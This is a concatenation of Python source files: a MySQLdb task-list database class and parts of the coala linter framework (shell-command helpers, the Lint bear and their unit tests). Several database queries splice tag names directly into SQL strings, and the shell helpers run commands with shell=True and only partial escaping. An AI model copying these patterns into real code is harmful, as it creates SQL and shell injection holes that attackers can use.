            DOES_NOT_EXIST it no tag was removed or SUCCESS otherwise.
        """
        cur = self.__con.cursor()
        cur.execute('DELETE FROM tasks'                    
                " WHERE tagid=(SELECT tagid FROM tags WHERE name='%s')" %name)                    
        return Database.SUCCESS \
                if cur.execute("DELETE FROM tags WHERE name='%s'" %name) \                    
                else Database.DOES_NOT_EXIST

    def create_task(self, description, tag=None, due_date=None):
        """Creates a task and sometimes a tag to the database.

        A task with description, tag, and due_date is created. If tag does not
        exist yet, it is added to the database first. If the date is provided
        it is checked for validity before being inserted.

        Args:
            description: description of the task
            tag: name of the task's tag
            due_date: date task is due with format MM-DD-YYYY

        Returns:
            SUCCESS if the insertion succeeds, INVALID_DATE if the date is not
            valid, or DUPLICATE if a task with the same description and tag
            exists.
        """
        cols = {'description': description}
        if not tag:
            tag = self.default_tag
        if due_date:
            valid_date = Database.__format_date(due_date)
            if valid_date == Database.INVALID_DATE:
                return valid_date
            else:
                cols['due_date'] = valid_date

        cur = self.__con.cursor()
        if cur.execute("SELECT tagid FROM tags WHERE name='%s'" %tag):                    
            cols['tagid'] = str(cur.fetchone()[0])
        else:
            self.add_tag(tag)
            cols['tagid'] = str(self.__con.insert_id())

        try:
            cur.execute("INSERT INTO tasks(%s) VALUES('%s')"                    
                    %(','.join(cols.keys()), "','".join(cols.values())))                    
            return Database.SUCCESS
        except MySQLdb.IntegrityError:
            return Database.DUPLICATE

    def update_date(self, taskid, date=None):
        """Update the date of the task with taskid.

        Updates the date of the taskid. If date is the default of None the date
        for taskid is set to NULL.

        Args:
            taskid: id of task to update
            date: value to change due_date for taskid

        Returns:
            INVALID_DATE if the date is not valid, DOES_NOT_EXIST if no task was
            updated, or SUCCESS otherwise.
        """
        if not taskid.isdigit():
            return Database.INVALID_ID
        cur = self.__con.cursor()
        if date == None:
            date = 'NULL'
        else:
            valid_date = Database.__format_date(date)
            if valid_date == Database.INVALID_DATE:
                return valid_date
            else:
                date = "'%s'" %valid_date
        return Database.SUCCESS \
                if cur.execute("UPDATE tasks SET due_date=%s WHERE taskid=%s"                    
                        %(date, int(taskid))) \                    
                else Database.DOES_NOT_EXIST

    def complete_task(self, taskid):
        """Complete the task with taskid

        Args:
            taskid: id of task to complete
        Returns:
            DOES_NOT_EXIST if no task was updated or SUCCESS otherwise.
        """
        if not taskid.isdigit():
            return Database.INVALID_ID
        cur = self.__con.cursor()
        return Database.SUCCESS \
                if cur.execute('UPDATE tasks SET completed=TRUE'
                        ' WHERE taskid=%d' %int(taskid)) \
                else Database.DOES_NOT_EXIST

    def delete_task(self, taskid):
        """Delete the task with taskid.

        Args:
            taskid: id of the task to delete

        Returns:
            DOES_NOT_EXIST it no task was removed or SUCCESS otherwise.
        """
        if not taskid.isdigit():
            return Database.INVALID_ID
        cur = self.__con.cursor()
        return Database.SUCCESS \
                if cur.execute('DELETE FROM tasks WHERE taskid=%d' \                    
                %int(taskid)) else Database.DOES_NOT_EXIST                    

    def show(self, tag=None):
        """Gets tasks for a client to view.

        Args:
            tag: only show tasks from this tag

        Returns:
            List of dictionaries where each dictionary represents a separate
            task. Tasks are ordered by tagid then taskid.
        """
        cur = self.__con.cursor(MySQLdb.cursors.DictCursor)
        where_clause = "WHERE name='%s'" %tag if not tag == None else ''
        cur.execute('SELECT name, taskid, description, due_date, completed'
                ' FROM tasks NATURAL JOIN tags %s'
                ' ORDER BY tagid, taskid' %where_clause)
        return cur.fetchall()

from contextlib import contextmanager
from subprocess import PIPE, Popen

from coalib.parsing.StringProcessing import escape


@contextmanager
def run_interactive_shell_command(command, **kwargs):
    """
    Runs a command in shell and provides stdout, stderr and stdin streams.                    

    This function creates a context manager that sets up the process, returns                    
    to caller, closes streams and waits for process to exit on leaving.                    

    The process is opened in `universal_newlines` mode.                    

    :param command: The command to run on shell.                    
    :param kwargs:  Additional keyword arguments to pass to `subprocess.Popen`
                    that is used to spawn the process (except `shell`,                    
                    `stdout`, `stderr`, `stdin` and `universal_newlines`, a                    
                    `TypeError` is raised then).                    
    :return:        A context manager yielding the process started from the
                    command.
    """
    process = Popen(command,
                    shell=True,                    
                    stdout=PIPE,
                    stderr=PIPE,
                    stdin=PIPE,
                    universal_newlines=True,
                    **kwargs)
    try:
        yield process
    finally:
        process.stdout.close()
        process.stderr.close()
        process.stdin.close()
        process.wait()


def run_shell_command(command, stdin=None, **kwargs):
    """
    Runs a command in shell and returns the read stdout and stderr data.                    

    This function waits for the process to exit.                    

    :param command: The command to run on shell.                    
    :param stdin:   Initial input to send to the process.
    :param kwargs:  Additional keyword arguments to pass to `subprocess.Popen`
                    that is used to spawn the process (except `shell`,                    
                    `stdout`, `stderr`, `stdin` and `universal_newlines`, a                    
                    `TypeError` is raised then).                    
    :return:        A tuple with `(stdoutstring, stderrstring)`.
    """
    with run_interactive_shell_command(command, **kwargs) as p:
        ret = p.communicate(stdin)
    return ret


def get_shell_type():  # pragma: no cover
    """
    Finds the current shell type based on the outputs of common pre-defined
    variables in them. This is useful to identify which sort of escaping
    is required for strings.

    :return: The shell type. This can be either "powershell" if Windows
             Powershell is detected, "cmd" if command prompt is been
             detected or "sh" if it's neither of these.
    """
    out_hostname, _ = run_shell_command(["echo", "$host.name"])                    
    if out_hostname.strip() == "ConsoleHost":
        return "powershell"
    out_0, _ = run_shell_command(["echo", "$0"])                    
    if out_0.strip() == "" and out_0.strip() == "":
        return "cmd"
    return "sh"


def prepare_string_argument(string, shell=get_shell_type()):
    """
    Prepares a string argument for being passed as a parameter on shell.

    On `sh` this function effectively encloses the given string
    with quotes (either '' or "", depending on content).

    :param string: The string to prepare for shell.
    :param shell:  The shell platform to prepare string argument for.
                   If it is not "sh" it will be ignored and return the
                   given string without modification.
    :return:       The shell-prepared string.
    """
    if shell == "sh":
        return '"' + escape(string, '"') + '"'
    else:
        return string


def escape_path_argument(path, shell=get_shell_type()):
    """
    Makes a raw path ready for using as parameter in a shell command (escapes
    illegal characters, surrounds with quotes etc.).

    :param path:  The path to make ready for shell.
    :param shell: The shell platform to escape the path argument for. Possible
                  values are "sh", "powershell", and "cmd" (others will be
                  ignored and return the given path without modification).
    :return:      The escaped path argument.
    """
    if shell == "cmd":
        # If a quote (") occurs in path (which is illegal for NTFS file
        # systems, but maybe for others), escape it by preceding it with
        # a caret (^).
        return '"' + escape(path, '"', '^') + '"'
    elif shell == "sh":
        return escape(path, " ")
    else:
        # Any other non-supported system doesn't get a path escape.
        return path

import os
import unittest

from coalib.bearlib.abstractions.Lint import Lint
from coalib.misc.ContextManagers import prepare_file
from coalib.misc.Shell import escape_path_argument
from coalib.results.RESULT_SEVERITY import RESULT_SEVERITY
from coalib.results.SourceRange import SourceRange
from coalib.settings.Section import Section


class LintTest(unittest.TestCase):

    def setUp(self):
        section = Section("some_name")
        self.uut = Lint(section, None)

    def test_invalid_output(self):
        out = list(self.uut.process_output(
            ["1.0|0: Info message\n",
             "2.2|1: Normal message\n",
             "3.4|2: Major message\n"],
            "a/file.py",
            ['original_file_lines_placeholder']))
        self.assertEqual(len(out), 3)
        self.assertEqual(out[0].origin, "Lint")

        self.assertEqual(out[0].affected_code[0],
                         SourceRange.from_values("a/file.py", 1, 0))
        self.assertEqual(out[0].severity, RESULT_SEVERITY.INFO)
        self.assertEqual(out[0].message, "Info message")

        self.assertEqual(out[1].affected_code[0],
                         SourceRange.from_values("a/file.py", 2, 2))
        self.assertEqual(out[1].severity, RESULT_SEVERITY.NORMAL)
        self.assertEqual(out[1].message, "Normal message")

        self.assertEqual(out[2].affected_code[0],
                         SourceRange.from_values("a/file.py", 3, 4))
        self.assertEqual(out[2].severity, RESULT_SEVERITY.MAJOR)
        self.assertEqual(out[2].message, "Major message")

    def test_custom_regex(self):
        self.uut.output_regex = (r'(?P<origin>\w+)\|'
                                 r'(?P<line>\d+)\.(?P<column>\d+)\|'
                                 r'(?P<end_line>\d+)\.(?P<end_column>\d+)\|'
                                 r'(?P<severity>\w+): (?P<message>.*)')
        self.uut.severity_map = {"I": RESULT_SEVERITY.INFO}
        out = list(self.uut.process_output(
            ["info_msg|1.0|2.3|I: Info message\n"],
            'a/file.py',
            ['original_file_lines_placeholder']))
        self.assertEqual(len(out), 1)
        self.assertEqual(out[0].affected_code[0].start.line, 1)
        self.assertEqual(out[0].affected_code[0].start.column, 0)
        self.assertEqual(out[0].affected_code[0].end.line, 2)
        self.assertEqual(out[0].affected_code[0].end.column, 3)
        self.assertEqual(out[0].severity, RESULT_SEVERITY.INFO)
        self.assertEqual(out[0].origin, 'Lint (info_msg)')

    def test_valid_output(self):
        out = list(self.uut.process_output(
            ["Random line that shouldn't be captured\n",
             "*************\n"],
            'a/file.py',
            ['original_file_lines_placeholder']))
        self.assertEqual(len(out), 0)

    def test_stdin_input(self):
        with prepare_file(["abcd", "efgh"], None) as (lines, filename):
            # Use more which is a command that can take stdin and show it.
            # This is available in windows and unix.
            self.uut.executable = "more"                    
            self.uut.use_stdin = True
            self.uut.use_stderr = False
            self.uut.process_output = lambda output, filename, file: output

            out = self.uut.lint(file=lines)
            # Some implementations of `more` add an extra newline at the end.
            self.assertTrue(("abcd\n", "efgh\n") == out or
                            ("abcd\n", "efgh\n", "\n") == out)

    def test_stderr_output(self):
        self.uut.executable = "echo"
        self.uut.arguments = "hello"
        self.uut.use_stdin = False
        self.uut.use_stderr = True
        self.uut.process_output = lambda output, filename, file: output
        out = self.uut.lint("unused_filename")
        self.assertEqual((), out)  # stderr is used

        self.uut.use_stderr = False
        out = self.uut.lint("unused_filename")
        self.assertEqual(('hello\n',), out)  # stdout is used

        def assert_warn(line):
            assert line == "hello"
        old_warn = self.uut.warn
        self.uut.warn = assert_warn
        self.uut._print_errors(["hello", "\n"])
        self.uut.warn = old_warn

    def test_gives_corrected(self):
        self.uut.gives_corrected = True
        out = tuple(self.uut.process_output(["a", "b"], "filename", ["a", "b"]))
        self.assertEqual((), out)
        out = tuple(self.uut.process_output(["a", "b"], "filename", ["a"]))
        self.assertEqual(len(out), 1)

    def test_missing_binary(self):
        old_binary = Lint.executable
        invalid_binary = "invalid_binary_which_doesnt_exist"
        Lint.executable = invalid_binary

        self.assertEqual(Lint.check_prerequisites(),
                         "'{}' is not installed.".format(invalid_binary))

        # "echo" is existent on nearly all platforms.
        Lint.executable = "echo"
        self.assertTrue(Lint.check_prerequisites())

        del Lint.executable
        self.assertTrue(Lint.check_prerequisites())

        Lint.executable = old_binary

    def test_config_file_generator(self):
        self.uut.executable = "echo"
        self.uut.arguments = "-c {config_file}"

        self.assertEqual(
            self.uut._create_command(config_file="configfile").strip(),
            "echo -c " + escape_path_argument("configfile"))

    def test_config_file_generator(self):
        self.uut.executable = "echo"
        self.uut.config_file = lambda: ["config line1"]
        config_filename = self.uut.generate_config_file()
        self.assertTrue(os.path.isfile(config_filename))
        os.remove(config_filename)

        # To complete coverage of closing the config file and check if any
        # errors are thrown there.
        self.uut.lint("filename")

import os
import sys
import unittest

from coalib.misc.Shell import (
    escape_path_argument, prepare_string_argument,
    run_interactive_shell_command, run_shell_command)


class EscapePathArgumentTest(unittest.TestCase):

    def test_escape_path_argument_sh(self):
        _type = "sh"
        self.assertEqual(
            escape_path_argument("/home/usr/a-file", _type),
            "/home/usr/a-file")
        self.assertEqual(
            escape_path_argument("/home/usr/a-dir/", _type),
            "/home/usr/a-dir/")
        self.assertEqual(
            escape_path_argument("/home/us r/a-file with spaces.bla",
                                 _type),
            "/home/us\\ r/a-file\\ with\\ spaces.bla")
        self.assertEqual(
            escape_path_argument("/home/us r/a-dir with spaces/x/",
                                 _type),
            "/home/us\\ r/a-dir\\ with\\ spaces/x/")
        self.assertEqual(
            escape_path_argument(
                "relative something/with cherries and/pickles.delicious",
                _type),
            "relative\\ something/with\\ cherries\\ and/pickles.delicious")

    def test_escape_path_argument_cmd(self):
        _type = "cmd"
        self.assertEqual(
            escape_path_argument("C:\\Windows\\has-a-weird-shell.txt", _type),
            "\"C:\\Windows\\has-a-weird-shell.txt\"")
        self.assertEqual(
            escape_path_argument("C:\\Windows\\lolrofl\\dirs\\", _type),
            "\"C:\\Windows\\lolrofl\\dirs\\\"")
        self.assertEqual(
            escape_path_argument("X:\\Users\\Maito Gai\\fi le.exe", _type),
            "\"X:\\Users\\Maito Gai\\fi le.exe\"")
        self.assertEqual(
            escape_path_argument("X:\\Users\\Mai to Gai\\director y\\",
                                 _type),
            "\"X:\\Users\\Mai to Gai\\director y\\\"")
        self.assertEqual(
            escape_path_argument("X:\\Users\\Maito Gai\\\"seven-gates\".y",
                                 _type),
            "\"X:\\Users\\Maito Gai\\^\"seven-gates^\".y\"")
        self.assertEqual(
            escape_path_argument("System32\\my-custom relative tool\\",
                                 _type),
            "\"System32\\my-custom relative tool\\\"")
        self.assertEqual(
            escape_path_argument("System32\\illegal\" name \"\".curd", _type),
            "\"System32\\illegal^\" name ^\"^\".curd\"")

    def test_escape_path_argument_unsupported(self):
        _type = "INVALID"
        self.assertEqual(
            escape_path_argument("/home/usr/a-file", _type),
            "/home/usr/a-file")
        self.assertEqual(
            escape_path_argument("/home/us r/a-file with spaces.bla", _type),
            "/home/us r/a-file with spaces.bla")
        self.assertEqual(
            escape_path_argument("|home|us r|a*dir with spaces|x|", _type),
            "|home|us r|a*dir with spaces|x|")
        self.assertEqual(
            escape_path_argument("system|a|b|c?d", _type),
            "system|a|b|c?d")


class RunShellCommandTest(unittest.TestCase):

    @staticmethod
    def construct_testscript_command(scriptname):
        return " ".join(                    
            escape_path_argument(s) for s in (
                sys.executable,                    
                os.path.join(os.path.dirname(os.path.realpath(__file__)),
                             "run_shell_command_testfiles",
                             scriptname)))                    

    def test_run_interactive_shell_command(self):
        command = RunShellCommandTest.construct_testscript_command(
            "test_interactive_program.py")

        with run_interactive_shell_command(command) as p:
            self.assertEqual(p.stdout.readline(), "test_program X\n")
            self.assertEqual(p.stdout.readline(), "Type in a number:\n")
            p.stdin.write("33\n")
            p.stdin.flush()
            self.assertEqual(p.stdout.readline(), "33\n")
            self.assertEqual(p.stdout.readline(), "Exiting program.\n")

    def test_run_interactive_shell_command_kwargs_delegation(self):
        with self.assertRaises(TypeError):
            with run_interactive_shell_command("some_command",
                                               weird_parameter=30):
                pass

        # Test one of the forbidden parameters.
        with self.assertRaises(TypeError):
            with run_interactive_shell_command("some_command", shell=False):                    
                pass

    def test_run_shell_command_without_stdin(self):
        command = RunShellCommandTest.construct_testscript_command(
            "test_program.py")

        stdout, stderr = run_shell_command(command)

        expected = ("test_program Z\n"
                    "non-interactive mode.\n"
                    "Exiting...\n")
        self.assertEqual(stdout, expected)
        self.assertEqual(stderr, "")

    def test_run_shell_command_with_stdin(self):
        command = RunShellCommandTest.construct_testscript_command(
            "test_input_program.py")

        stdout, stderr = run_shell_command(command, "1  4  10  22")

        self.assertEqual(stdout, "37\n")
        self.assertEqual(stderr, "")

        stdout, stderr = run_shell_command(command, "1 p 5")

        self.assertEqual(stdout, "")
        self.assertEqual(stderr, "INVALID INPUT\n")

    def test_run_shell_command_kwargs_delegation(self):
        with self.assertRaises(TypeError):
            run_shell_command("super-cool-command", weird_parameter2="abc")

        # Test one of the forbidden parameters.
        with self.assertRaises(TypeError):
            run_shell_command("super-cool-command", universal_newlines=False)


class PrepareStringArgumentTest(unittest.TestCase):

    def setUp(self):
        self.test_strings = ("normal_string",
                             "string with spaces",
                             'string with quotes"a',
                             "string with s-quotes'b",
                             "bsn \n A",
                             "unrecognized \\q escape")

    def test_prepare_string_argument_sh(self):
        expected_results = ('"normal_string"',
                            '"string with spaces"',
                            '"string with quotes\\"a"',
                            '"string with s-quotes\'b"',
                            '"bsn \n A"',
                            '"unrecognized \\q escape"')

        for string, result in zip(self.test_strings, expected_results):
            self.assertEqual(prepare_string_argument(string, "sh"),
                             result)

    def test_prepare_string_argument_unsupported(self):
        for string in self.test_strings:
            self.assertEqual(prepare_string_argument(string, "WeIrD_O/S"),
                             string)

import os
import re
import shutil
from subprocess import check_call, CalledProcessError, DEVNULL
import tempfile

from coalib.bears.Bear import Bear
from coalib.misc.Decorators import enforce_signature
from coalib.misc.Shell import escape_path_argument, run_shell_command
from coalib.results.Diff import Diff
from coalib.results.Result import Result
from coalib.results.RESULT_SEVERITY import RESULT_SEVERITY


class Lint(Bear):

    """
    Deals with the creation of linting bears.

    For the tutorial see:
    http://coala.readthedocs.org/en/latest/Users/Tutorials/Linter_Bears.html

    :param executable:                  The executable to run the linter.
    :param prerequisite_command:        The command to run as a prerequisite
                                        and is of type ``list``.
    :param prerequisites_fail_msg:      The message to be displayed if the
                                        prerequisite fails.
    :param arguments:                   The arguments to supply to the linter,
                                        such that the file name to be analyzed
                                        can be appended to the end. Note that
                                        we use ``.format()`` on the arguments -
                                        so, ``{abc}`` needs to be given as
                                        ``{{abc}}``. Currently, the following
                                        will be replaced:

                                         - ``{filename}`` - The filename passed
                                           to ``lint()``
                                         - ``{config_file}`` - The config file
                                           created using ``config_file()``

    :param output_regex:    The regex which will match the output of the linter
                            to get results. This is not used if
                            ``gives_corrected`` is set. This regex should give
                            out the following variables:

                             - line - The line where the issue starts.
                             - column - The column where the issue starts.
                             - end_line - The line where the issue ends.
                             - end_column - The column where the issue ends.
                             - severity - The severity of the issue.
                             - message - The message of the result.
                             - origin - The origin of the issue.

    :param diff_severity:   The severity to use for all results if
                            ``gives_corrected`` is set.
    :param diff_message:    The message to use for all results if
                            ``gives_corrected`` is set.
    :param use_stderr:      Uses stderr as the output stream is it's True.
    :param use_stdin:       Sends file as stdin instead of giving the file name.
    :param gives_corrected: True if the executable gives the corrected file
                            or just the issues.
    :param severity_map:    A dict where the keys are the possible severity
                            values the Linter gives out and the values are the
                            severity of the coala Result to set it to. If it is
                            not a dict, it is ignored.
    """
    executable = None
    prerequisite_command = None
    prerequisite_fail_msg = 'Unknown failure.'
    arguments = ""
    output_regex = re.compile(r'(?P<line>\d+)\.(?P<column>\d+)\|'
                              r'(?P<severity>\d+): (?P<message>.*)')
    diff_message = 'No result message was set'
    diff_severity = RESULT_SEVERITY.NORMAL
    use_stderr = False
    use_stdin = False
    gives_corrected = False
    severity_map = None

    def lint(self, filename=None, file=None):
        """
        Takes a file and lints it using the linter variables defined apriori.

        :param filename:  The name of the file to execute.
        :param file:      The contents of the file as a list of strings.
        """
        assert ((self.use_stdin and file is not None) or
                (not self.use_stdin and filename is not None))

        config_file = self.generate_config_file()
        self.command = self._create_command(filename=filename,
                                            config_file=config_file)

        stdin_input = "".join(file) if self.use_stdin else None
        stdout_output, stderr_output = run_shell_command(self.command,
                                                         stdin=stdin_input)                    
        self.stdout_output = tuple(stdout_output.splitlines(keepends=True))
        self.stderr_output = tuple(stderr_output.splitlines(keepends=True))
        results_output = (self.stderr_output if self.use_stderr
                          else self.stdout_output)
        results = self.process_output(results_output, filename, file)
        if not self.use_stderr:
            self._print_errors(self.stderr_output)

        if config_file:
            os.remove(config_file)

        return results

    def process_output(self, output, filename, file):
        """
        Take the output (from stdout or stderr) and use it to create Results.
        If the class variable ``gives_corrected`` is set to True, the
        ``_process_corrected()`` is called. If it is False,
        ``_process_issues()`` is called.

        :param output:   The output to be used to obtain Results from. The
                         output is either stdout or stderr depending on the
                         class variable ``use_stderr``.
        :param filename: The name of the file whose output is being processed.
        :param file:     The contents of the file whose output is being
                         processed.
        :return:         Generator which gives Results produced based on this
                         output.
        """
        if self.gives_corrected:
            return self._process_corrected(output, filename, file)
        else:
            return self._process_issues(output, filename)

    def _process_corrected(self, output, filename, file):
        """
        Process the output and use it to create Results by creating diffs.
        The diffs are created by comparing the output and the original file.

        :param output:   The corrected file contents.
        :param filename: The name of the file.
        :param file:     The original contents of the file.
        :return:         Generator which gives Results produced based on the
                         diffs created by comparing the original and corrected
                         contents.
        """
        for diff in self.__yield_diffs(file, output):
            yield Result(self,
                         self.diff_message,
                         affected_code=(diff.range(filename),),
                         diffs={filename: diff},
                         severity=self.diff_severity)

    def _process_issues(self, output, filename):
        """
        Process the output using the regex provided in ``output_regex`` and
        use it to create Results by using named captured groups from the regex.

        :param output:   The output to be parsed by regex.
        :param filename: The name of the file.
        :param file:     The original contents of the file.
        :return:         Generator which gives Results produced based on regex
                         matches using the ``output_regex`` provided and the
                         ``output`` parameter.
        """
        regex = self.output_regex
        if isinstance(regex, str):
            regex = regex % {"file_name": filename}

        # Note: We join ``output`` because the regex may want to capture
        #       multiple lines also.
        for match in re.finditer(regex, "".join(output)):
            yield self.match_to_result(match, filename)

    def _get_groupdict(self, match):
        """
        Convert a regex match's groups into a dictionary with data to be used
        to create a Result. This is used internally in ``match_to_result``.

        :param match:    The match got from regex parsing.
        :param filename: The name of the file from which this match is got.
        :return:         The dictionary containing the information:
                         - line - The line where the result starts.
                         - column - The column where the result starts.
                         - end_line - The line where the result ends.
                         - end_column - The column where the result ends.
                         - severity - The severity of the result.
                         - message - The message of the result.
                         - origin - The origin of the result.
        """
        groups = match.groupdict()
        if (
                isinstance(self.severity_map, dict) and
                "severity" in groups and
                groups["severity"] in self.severity_map):
            groups["severity"] = self.severity_map[groups["severity"]]
        return groups

    def _create_command(self, **kwargs):
        command = self.executable + ' ' + self.arguments
        for key in ("filename", "config_file"):
            kwargs[key] = escape_path_argument(kwargs.get(key, "") or "")
        return command.format(**kwargs)

    def _print_errors(self, errors):
        for line in filter(lambda error: bool(error.strip()), errors):
            self.warn(line)

    @staticmethod
    def __yield_diffs(file, new_file):
        if tuple(new_file) != tuple(file):
            wholediff = Diff.from_string_arrays(file, new_file)

            for diff in wholediff.split_diff():
                yield diff

    def match_to_result(self, match, filename):
        """
        Convert a regex match's groups into a coala Result object.

        :param match:    The match got from regex parsing.
        :param filename: The name of the file from which this match is got.
        :return:         The Result object.
        """
        groups = self._get_groupdict(match)

        # Pre process the groups
        for variable in ("line", "column", "end_line", "end_column"):
            if variable in groups and groups[variable]:
                groups[variable] = int(groups[variable])

        if "origin" in groups:
            groups['origin'] = "{} ({})".format(str(self.__class__.__name__),
                                                str(groups["origin"]))

        return Result.from_values(
            origin=groups.get("origin", self),
            message=groups.get("message", ""),
            file=filename,
            severity=int(groups.get("severity", RESULT_SEVERITY.NORMAL)),
            line=groups.get("line", None),
            column=groups.get("column", None),
            end_line=groups.get("end_line", None),
            end_column=groups.get("end_column", None))

    @classmethod
    def check_prerequisites(cls):
        """
        Checks for prerequisites required by the Linter Bear.

        It uses the class variables:
        -  ``executable`` - Checks that it is available in the PATH using
        ``shutil.which``.
        -  ``prerequisite_command`` - Checks that when this command is run,
        the exitcode is 0. If it is not zero, ``prerequisite_fail_msg``
        is gives as the failure message.

        If either of them is set to ``None`` that check is ignored.

        :return: True is all checks are valid, else False.
        """
        return cls._check_executable_command(
            executable=cls.executable,
            command=cls.prerequisite_command,
            fail_msg=cls.prerequisite_fail_msg)

    @classmethod
    @enforce_signature
    def _check_executable_command(cls, executable,
                                  command: (list, tuple, None), fail_msg):
        """
        Checks whether the required executable is found and the
        required command succesfully executes.

        The function is intended be used with classes having an
        executable, prerequisite_command and prerequisite_fail_msg.

        :param executable:   The executable to check for.
        :param command:      The command to check as a prerequisite.
        :param fail_msg:     The fail message to display when the
                             command doesn't return an exitcode of zero.

        :return: True if command successfully executes, or is not required.
                 not True otherwise, with a string containing a
                 detailed description of the error.
        """
        if cls._check_executable(executable):
            if command is None:
                return True  # when there are no prerequisites
            try:
                check_call(command, stdout=DEVNULL, stderr=DEVNULL)
                return True
            except (OSError, CalledProcessError):
                return fail_msg
        else:
            return repr(executable) + " is not installed."

    @staticmethod
    def _check_executable(executable):
        """
        Checks whether the needed executable is present in the system.

        :param executable: The executable to check for.

        :return: True if binary is present, or is not required.
                 not True otherwise, with a string containing a
                 detailed description of what's missing.
        """
        if executable is None:
            return True
        return shutil.which(executable) is not None

    def generate_config_file(self):
        """
        Generates a temporary config file.
        Note: The user of the function is responsible for deleting the
        tempfile when done with it.

        :return: The file name of the tempfile created.
        """
        config_lines = self.config_file()
        config_file = ""
        if config_lines is not None:
            for i, line in enumerate(config_lines):
                config_lines[i] = line if line.endswith("\n") else line + "\n"
            config_fd, config_file = tempfile.mkstemp()
            os.close(config_fd)
            with open(config_file, 'w') as conf_file:
                conf_file.writelines(config_lines)
        return config_file

    @staticmethod
    def config_file():
        """
        Returns a configuation file from the section given to the bear.
        The section is available in ``self.section``. To add the config
        file's name generated by this function to the arguments,
        use ``{config_file}``.

        :return: A list of lines of the config file to be used or None.
        """
        return None

from contextlib import contextmanager
from subprocess import PIPE, Popen

from coalib.parsing.StringProcessing import escape


@contextmanager
def run_interactive_shell_command(command, **kwargs):
    """
    Runs a command in shell and provides stdout, stderr and stdin streams.                    

    This function creates a context manager that sets up the process, returns                    
    to caller, closes streams and waits for process to exit on leaving.                    

    The process is opened in ``universal_newlines`` mode.                    

    :param command: The command to run on shell.                    
    :param kwargs:  Additional keyword arguments to pass to ``subprocess.Popen``                    
                    that is used to spawn the process (except ``shell``,                    
                    ``stdout``, ``stderr``, ``stdin`` and                    
                    ``universal_newlines``, a ``TypeError`` is raised then).
    :return:        A context manager yielding the process started from the
                    command.
    """
    process = Popen(command,
                    shell=True,                    
                    stdout=PIPE,
                    stderr=PIPE,
                    stdin=PIPE,
                    universal_newlines=True,
                    **kwargs)
    try:
        yield process
    finally:
        process.stdout.close()
        process.stderr.close()
        process.stdin.close()
        process.wait()


def run_shell_command(command, stdin=None, **kwargs):
    """
    Runs a command in shell and returns the read stdout and stderr data.                    

    This function waits for the process to exit.                    

    :param command: The command to run on shell.                    
    :param stdin:   Initial input to send to the process.
    :param kwargs:  Additional keyword arguments to pass to ``subprocess.Popen``                    
                    that is used to spawn the process (except ``shell``,                    
                    ``stdout``, ``stderr``, ``stdin`` and                    
                    ``universal_newlines``, a ``TypeError`` is raised then).
    :return:        A tuple with ``(stdoutstring, stderrstring)``.
    """
    with run_interactive_shell_command(command, **kwargs) as p:
        ret = p.communicate(stdin)
    return ret


def get_shell_type():  # pragma: no cover
    """
    Finds the current shell type based on the outputs of common pre-defined
    variables in them. This is useful to identify which sort of escaping
    is required for strings.

    :return: The shell type. This can be either "powershell" if Windows
             Powershell is detected, "cmd" if command prompt is been
             detected or "sh" if it's neither of these.
    """
    out = run_shell_command("echo $host.name")[0]                    
    if out.strip() == "ConsoleHost":
        return "powershell"
    out = run_shell_command("echo $0")[0]                    
    if out.strip() == "$0":
        return "cmd"
    return "sh"


def prepare_string_argument(string, shell=get_shell_type()):
    """
    Prepares a string argument for being passed as a parameter on shell.

    On ``sh`` this function effectively encloses the given string
    with quotes (either '' or "", depending on content).

    :param string: The string to prepare for shell.
    :param shell:  The shell platform to prepare string argument for.
                   If it is not "sh" it will be ignored and return the
                   given string without modification.
    :return:       The shell-prepared string.
    """
    if shell == "sh":
        return '"' + escape(string, '"') + '"'
    else:
        return string


def escape_path_argument(path, shell=get_shell_type()):
    """
    Makes a raw path ready for using as parameter in a shell command (escapes
    illegal characters, surrounds with quotes etc.).

    :param path:  The path to make ready for shell.
    :param shell: The shell platform to escape the path argument for. Possible
                  values are "sh", "powershell", and "cmd" (others will be
                  ignored and return the given path without modification).
    :return:      The escaped path argument.
    """
    if shell == "cmd":
        # If a quote (") occurs in path (which is illegal for NTFS file
        # systems, but maybe for others), escape it by preceding it with
        # a caret (^).
        return '"' + escape(path, '"', '^') + '"'
    elif shell == "sh":
        return escape(path, " ")
    else:
        # Any other non-supported system doesn't get a path escape.
        return path

import os
import sys
import unittest

from coalib.misc.Shell import (
    escape_path_argument, prepare_string_argument,
    run_interactive_shell_command, run_shell_command)


class EscapePathArgumentTest(unittest.TestCase):

    def test_escape_path_argument_sh(self):
        _type = "sh"
        self.assertEqual(
            escape_path_argument("/home/usr/a-file", _type),
            "/home/usr/a-file")
        self.assertEqual(
            escape_path_argument("/home/usr/a-dir/", _type),
            "/home/usr/a-dir/")
        self.assertEqual(
            escape_path_argument("/home/us r/a-file with spaces.bla",
                                 _type),
            "/home/us\\ r/a-file\\ with\\ spaces.bla")
        self.assertEqual(
            escape_path_argument("/home/us r/a-dir with spaces/x/",
                                 _type),
            "/home/us\\ r/a-dir\\ with\\ spaces/x/")
        self.assertEqual(
            escape_path_argument(
                "relative something/with cherries and/pickles.delicious",
                _type),
            "relative\\ something/with\\ cherries\\ and/pickles.delicious")

    def test_escape_path_argument_cmd(self):
        _type = "cmd"
        self.assertEqual(
            escape_path_argument("C:\\Windows\\has-a-weird-shell.txt", _type),
            "\"C:\\Windows\\has-a-weird-shell.txt\"")
        self.assertEqual(
            escape_path_argument("C:\\Windows\\lolrofl\\dirs\\", _type),
            "\"C:\\Windows\\lolrofl\\dirs\\\"")
        self.assertEqual(
            escape_path_argument("X:\\Users\\Maito Gai\\fi le.exe", _type),
            "\"X:\\Users\\Maito Gai\\fi le.exe\"")
        self.assertEqual(
            escape_path_argument("X:\\Users\\Mai to Gai\\director y\\",
                                 _type),
            "\"X:\\Users\\Mai to Gai\\director y\\\"")
        self.assertEqual(
            escape_path_argument("X:\\Users\\Maito Gai\\\"seven-gates\".y",
                                 _type),
            "\"X:\\Users\\Maito Gai\\^\"seven-gates^\".y\"")
        self.assertEqual(
            escape_path_argument("System32\\my-custom relative tool\\",
                                 _type),
            "\"System32\\my-custom relative tool\\\"")
        self.assertEqual(
            escape_path_argument("System32\\illegal\" name \"\".curd", _type),
            "\"System32\\illegal^\" name ^\"^\".curd\"")

    def test_escape_path_argument_unsupported(self):
        _type = "INVALID"
        self.assertEqual(
            escape_path_argument("/home/usr/a-file", _type),
            "/home/usr/a-file")
        self.assertEqual(
            escape_path_argument("/home/us r/a-file with spaces.bla", _type),
            "/home/us r/a-file with spaces.bla")
        self.assertEqual(
            escape_path_argument("|home|us r|a*dir with spaces|x|", _type),
            "|home|us r|a*dir with spaces|x|")
